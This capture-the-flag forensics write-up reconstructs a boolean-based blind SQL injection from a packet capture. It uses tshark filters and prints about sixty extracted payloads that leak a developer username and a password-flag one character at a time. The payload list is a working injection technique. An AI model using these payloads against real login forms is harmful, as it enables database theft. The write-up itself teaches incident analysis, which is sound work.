## pain in the ass - forensics

It looks like someone dumped our database. Please help us know what has been leaked ...

packets summary:

tcp 3000, small packets (many)

10785 packets on port 5432 (postgres)

It looks like a blind SQL injection (boolean based.) We want to find out what was extracted. It looks like all the blind injection attacks are sent to the `/login/auth` endpoint via a POST request.

wireshark filter:

`http.response_for.uri == "http://localhost:3000/login/auth"`

The successful responses from the database has an error that says the result contains Multiple columns. This can be filtered using `data-text-lines contains "something.."`

Using a filter in tshark (terminal wireshark):
```
tshark -r pain-in-the-ass.pcapng -Y 'http.response_for.uri == "http://localhost:3000/login/auth" and data-text-lines contains Multiple' -T fields -e tcp.stream |wc
      69      69     331
```

save all the streams, use this filter (crafted with a for loop)
```
http.request.method == POST and tcp.stream == 530 or tcp.stream == 586 or tcp.stream == 608 or tcp.stream == 617 or tcp.stream == 631 or tcp.stream == 729 or tcp.stream == 737 or tcp.stream == 748 or tcp.stream == 777 or tcp.stream == 823 or tcp.stream == 855 or tcp.stream == 918 or tcp.stream == 975 or tcp.stream == 987 or tcp.stream == 1000 or tcp.stream == 1053 or tcp.stream == 1072 or tcp.stream == 1092 or tcp.stream == 1166 or tcp.stream == 1174 or tcp.stream == 1228 or tcp.stream == 1232 or tcp.stream == 1236 or tcp.stream == 1292 or tcp.stream == 1306 or tcp.stream == 1380 or tcp.stream == 1436 or tcp.stream == 1460 or tcp.stream == 1480 or tcp.stream == 1498 or tcp.stream == 1555 or tcp.stream == 1558 or tcp.stream == 1578 or tcp.stream == 1632 or tcp.stream == 1685 or tcp.stream == 1699 or tcp.stream == 1773 or tcp.stream == 1826 or tcp.stream == 1831 or tcp.stream == 1885 or tcp.stream == 1946 or tcp.stream == 1951 or tcp.stream == 2007 or tcp.stream == 2063 or tcp.stream == 2122 or tcp.stream == 2123 or tcp.stream == 2127 or tcp.stream == 2130 or tcp.stream == 2191 or tcp.stream == 2246 or tcp.stream == 2302 or tcp.stream == 2361 or tcp.stream == 2362 or tcp.stream == 2415 or tcp.stream == 2472 or tcp.stream == 2530 or tcp.stream == 2585 or tcp.stream == 2588 or tcp.stream == 2592 or tcp.stream == 2650 or tcp.stream == 2710 or tcp.stream == 2763 or tcp.stream == 2769 or tcp.stream == 2829 or tcp.stream == 2886 or tcp.stream == 2944 or tcp.stream == 3001 or tcp.stream == 3056 or tcp.stream == 3120
```

Running it in tshark:

```

tshark -r pain-in-the-ass.pcapng -Y 'http.request.method == POST and tcp.stream == 530 or tcp.stream == 586 or tcp.stream == 608 or tcp.stream == 617 or tcp.stream == 631 or tcp.stream == 729 or tcp.stream == 737 or tcp.stream == 748 or tcp.stream == 777 or tcp.stream == 823 or tcp.stream == 855 or tcp.stream == 918 or tcp.stream == 975 or tcp.stream == 987 or tcp.stream == 1000 or tcp.stream == 1053 or tcp.stream == 1072 or tcp.stream == 1092 or tcp.stream == 1166 or tcp.stream == 1174 or tcp.stream == 1228 or tcp.stream == 1232 or tcp.stream == 1236 or tcp.stream == 1292 or tcp.stream == 1306 or tcp.stream == 1380 or tcp.stream == 1436 or tcp.stream == 1460 or tcp.stream == 1480 or tcp.stream == 1498 or tcp.stream == 1555 or tcp.stream == 1558 or tcp.stream == 1578 or tcp.stream == 1632 or tcp.stream == 1685 or tcp.stream == 1699 or tcp.stream == 1773 or tcp.stream == 1826 or tcp.stream == 1831 or tcp.stream == 1885 or tcp.stream == 1946 or tcp.stream == 1951 or tcp.stream == 2007 or tcp.stream == 2063 or tcp.stream == 2122 or tcp.stream == 2123 or tcp.stream == 2127 or tcp.stream == 2130 or tcp.stream == 2191 or tcp.stream == 2246 or tcp.stream == 2302 or tcp.stream == 2361 or tcp.stream == 2362 or tcp.stream == 2415 or tcp.stream == 2472 or tcp.stream == 2530 or tcp.stream == 2585 or tcp.stream == 2588 or tcp.stream == 2592 or tcp.stream == 2650 or tcp.stream == 2710 or tcp.stream == 2763 or tcp.stream == 2769 or tcp.stream == 2829 or tcp.stream == 2886 or tcp.stream == 2944 or tcp.stream == 3001 or tcp.stream == 3056 or tcp.stream == 3120 and urlencoded-form.key == "password"' -T fields -e urlencoded-form.value
d4rk2phi,' or substr((SELECT dev_username FROM developpers LIMIT 1 OFFSET 0),1,1) = 'k' and '1
d4rk2phi,' or substr((SELECT dev_username FROM developpers LIMIT 1 OFFSET 0),2,1) = '3' and '1
d4rk2phi,' or substr((SELECT dev_username FROM developpers LIMIT 1 OFFSET 0),3,1) = 'v' and '1
d4rk2phi,' or substr((SELECT dev_username FROM developpers LIMIT 1 OFFSET 0),4,1) = 'i' and '1
d4rk2phi,' or substr((SELECT dev_username FROM developpers LIMIT 1 OFFSET 0),5,1) = 'n' and '1
d4rk2phi,' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),1,1) = 's' and '1
d4rk2phi,' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),2,1) = 'h' and '1
d4rk2phi,' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),3,1) = 'k' and '1
d4rk2phi,' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),4,1) = 'C' and '1
d4rk2phi,' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),5,1) = 'T' and '1
d4rk2phi,' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),6,1) = 'F' and '1
d4rk2phi,' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),7,1) = '{' and '1
d4rk2phi,' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),8,1) = '4' and '1
d4rk2phi,' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),9,1) = 'l' and '1
d4rk2phi,' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),10,1) = 'm' and '1
d4rk2phi,' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),11,1) = '0' and '1
d4rk2phi,' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),12,1) = 's' and '1
d4rk2phi,' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),13,1) = 't' and '1
d4rk2phi,' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),14,1) = '_' and '1
d4rk2phi,' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),15,1) = 'h' and '1
d4rk2phi,' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),16,1) = '1' and '1
d4rk2phi,' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),17,1) = 'd' and '1
d4rk2phi,' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),18,1) = 'd' and '1
d4rk2phi,' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),19,1) = '3' and '1
d4rk2phi,' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),20,1) = 'n' and '1
d4rk2phi,' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),21,1) = '_' and '1
d4rk2phi,' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),22,1) = '3' and '1
d4rk2phi,' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),23,1) = 'x' and '1
d4rk2phi,' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),24,1) = 't' and '1
d4rk2phi,' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),25,1) = 'r' and '1
d4rk2phi,' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),26,1) = '4' and '1
d4rk2phi,' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),27,1) = 'c' and '1
d4rk2phi,' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),28,1) = 't' and '1
d4rk2phi,' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),29,1) = '1' and '1
d4rk2phi,' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),30,1) = '0' and '1
d4rk2phi,' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),31,1) = 'n' and '1
d4rk2phi,' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),32,1) = '_' and '1
d4rk2phi,' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),33,1) = '0' and '1
d4rk2phi,' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),34,1) = 'e' and '1
d4rk2phi,' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),35,1) = '1' and '1
d4rk2phi,' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),36,1) = '8' and '1
d4rk2phi,' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),37,1) = 'e' and '1
d4rk2phi,' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),38,1) = '3' and '1
d4rk2phi,' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),39,1) = '3' and '1
d4rk2phi,' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),40,1) = '6' and '1
d4rk2phi,' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),41,1) = 'a' and '1
d4rk2phi,' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),42,1) = 'd' and '1
d4rk2phi,' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),43,1) = 'c' and '1
d4rk2phi,' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),44,1) = '8' and '1
d4rk2phi,' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),45,1) = '2' and '1
d4rk2phi,' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),46,1) = '3' and '1
d4rk2phi,' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),47,1) = '6' and '1
d4rk2phi,' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),48,1) = 'a' and '1
d4rk2phi,' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),49,1) = '0' and '1
d4rk2phi,' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),50,1) = '4' and '1
d4rk2phi,' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),51,1) = '5' and '1
d4rk2phi,' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),52,1) = '2' and '1
d4rk2phi,' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),53,1) = 'c' and '1
d4rk2phi,' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),54,1) = 'd' and '1
d4rk2phi,' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),55,1) = '5' and '1
d4rk2phi,' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),56,1) = '7' and '1
d4rk2phi,' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),57,1) = '0' and '1
d4rk2phi,' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),58,1) = 'f' and '1
d4rk2phi,' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),59,1) = '7' and '1
d4rk2phi,' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),60,1) = '4' and '1
d4rk2phi,' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),61,1) = '5' and '1
d4rk2phi,' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),62,1) = '4' and '1
d4rk2phi,' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),63,1) = '2' and '1
d4rk2phi,' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),64,1) = '}' and '1
```

can pipe to ` | cut -d '=' -f 2 | cut -d "'" -f 2`
`shkCTF{4lm0st_h1dd3n_3xtr4ct10n_0e18e336adc8236a0452cd570f74542}`

